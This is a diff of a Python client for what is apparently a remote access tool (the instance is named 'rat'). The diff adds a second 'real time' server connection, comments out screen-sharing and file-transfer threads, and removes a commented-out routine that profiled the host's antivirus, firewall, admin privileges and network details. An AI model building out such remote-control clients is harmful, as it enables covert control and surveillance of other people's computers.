@@ -35,13 +35,13 @@ CREATE_ALWAYS = 2
 
 # Define CLIENT class
 class CLIENT:
-    def __init__(self, host, port):
+    def __init__(self, host, port, realtimehost, realtimeport):
         self.host = host
         self.port = port
         self.curdir = os.getcwd()
         self.command_history = []
 
-        self.socketClient = SocketClient(host, port)
+        self.socketClient = SocketClient(host, port, realtimehost, realtimeport)
         if (self.socketClient.connected == False):
             print("Error connecting to server")
             return
@@ -49,95 +49,30 @@ class CLIENT:
         if (self.socketClient.connected == True):
             print("Connected to server")
 
-            self.screenshareClient = ScreenShare()
+            self.socketClient.real_time_connect()
+            print("Connected to real time server")
 
-            # Initialize file upload manager
-            self.file_upload_manager = FileTransfer("localhost", 4440)
+            # self.screenshareClient = ScreenShare()
 
-            # Start file upload thread
-            self.file_transfer_thread = Thread(
-                target=self.file_upload_manager.connect)
-            self.file_transfer_thread.start()
+            # # Initialize file upload manager
+            # self.file_upload_manager = FileTransfer("localhost", 4440)
 
-            # Initialize file download manager
-            self.file_download_manager = FileDownload("localhost", 4441)
+            # # Start file upload thread
+            # self.file_transfer_thread = Thread(
+            #     target=self.file_upload_manager.connect)
+            # self.file_transfer_thread.start()
 
-            # Start file download thread
-            self.file_download_thread = Thread(
-                target=self.file_download_manager.connect)
-            self.file_download_thread.start()
+            # # Initialize file download manager
+            # self.file_download_manager = FileDownload("localhost", 4441)
+
+            # # Start file download thread
+            # self.file_download_thread = Thread(
+            #     target=self.file_download_manager.connect)
+            # self.file_download_thread.start()
 
             self.terminal = Terminal()
 
             self.execute()
-
-    # Function to gather system information
-    # def gather_info(self):
-        
-
-        
-
-    #     optional_info = {
-    #         "Microsoft Defender": "Enabled",
-    #         "Antivirus": "AVG",
-    #         "Firewall": "Enabled",
-    #         "Uptime": str(round((psutil.boot_time() - psutil.boot_time()) / 3600, 2)) + " hours",
-    #         "Idle Time": str(round((psutil.cpu_times().idle) / 3600, 2)) + " hours",
-    #         "Privileges": ctypes.windll.shell32.IsUserAnAdmin(),
-    #         "Bit": platform.architecture()[0],
-    #         "SafeLink Version": "1.0",
-    #         "ComputerID": "123456",
-    #         "Current Directory": os.getcwd(),
-    #     }
-
-    #     # get browser info
-    #     # get all browsers installed on the system
-    #     #browsers = handle_browser_information()
-
-    #     client_info = {
-    #         "System Info": system_info,
-    #         "Optional Info": optional_info,
-    #         #"Browsers": browsers,
-    #         "Computer Hardware": {
-    #             "CPU": "Intel Core i7",
-    #             "GPU": "NVIDIA GeForce RTX 3080",
-    #             "RAM": "32 GB",
-    #             "Motherboard": "ASUS ROG Strix Z590",
-    #             "Storage": {
-    #                 "Total": "1 TB SSD",
-    #                 "Free": "500 GB"
-    #             },
-    #             "Audio": "Realtek HD Audio",
-    #             "USB Devices": [
-    #                 "USB Mouse",
-    #                 "USB Keyboard",
-    #                 "USB Flash Drive"
-    #             ]
-    #         },
-    #         "Network Info": {
-    #             "Network Adapter": {
-    #                 "Name": "Ethernet",
-    #                 "Status": "Connected",
-    #                 "Speed": "1 Gbps",
-    #                 "Type": "Wired"
-    #             },
-    #             "Network Speed": "100 Mbps",
-    #             "Network Type": "Wi-Fi",
-    #             "Network Status": "Connected",
-    #             "Network Usage": {
-    #                 "Upload": "1.2 MB/s",
-    #                 "Download": "5.3 MB/s"
-    #             },
-    #             "Network Connections": [
-    #                 {
-    #                     "IP": "192.168.1.2",
-    #                     "Port": 80,
-    #                     "Protocol": "HTTP"
-    #                 },
-    #             ]
-    #         }
-    #     }
-    #     return json.dumps(client_info)
 
     def execute(self):
         while True:
@@ -218,5 +153,5 @@ class CLIENT:
 
 
 if __name__ == '__main__':
-    rat = CLIENT('localhost', 4444)
+    rat = CLIENT('localhost', 4444, 'localhost', 4443)
     print("Exiting...")
